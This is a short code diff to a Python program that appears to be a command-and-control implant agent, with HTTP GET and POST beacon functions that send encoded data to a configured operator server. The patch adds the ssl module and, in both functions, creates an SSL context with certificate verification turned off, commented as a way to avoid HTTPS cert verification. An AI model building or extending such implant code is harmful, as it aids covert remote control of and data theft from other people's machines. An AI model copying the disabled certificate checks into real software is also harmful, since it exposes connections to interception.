@@ -1,4 +1,4 @@
-import os, random, sys, json, socket, base64, time, platform
+import os, random, sys, json, socket, base64, time, platform, ssl
 import urllib.request
 from datetime import datetime
 import threading, queue
@@ -152,6 +152,10 @@ CRYPTO_HERE
             hdrs[header["name"]] = header["value"]
         req = urllib.request.Request(self.agent_config["Server"] + self.agent_config["GetURI"] + "?" + self.agent_config["GetURI"] + "=" + data.decode(), hdrs)
 
+        # To avoid HTTPS cert verification
+        gcontext = ssl.SSLContext()
+        gcontext.verify_mode = ssl.CERT_NONE
+
         if self.agent_config["ProxyHost"] and self.agent_config["ProxyPort"]:
             tls = "https" if self.agent_config["ProxyHost"][0:5] == "https" else "http"
             handler = urllib.request.HTTPSHandler if tls else urllib.request.HTTPHandler
@@ -181,6 +185,10 @@ CRYPTO_HERE
         for header in self.agent_config["Headers"]:
             hdrs[header["name"]] = header["value"]
         req = urllib.request.Request(self.agent_config["Server"] + self.agent_config["PostURI"], data, hdrs)
+
+        # To avoid HTTPS cert verification
+        gcontext = ssl.SSLContext()
+        gcontext.verify_mode = ssl.CERT_NONE
 
         if self.agent_config["ProxyHost"] and self.agent_config["ProxyPort"]:
             tls = "https" if self.agent_config["ProxyHost"][0:5] == "https" else "http"
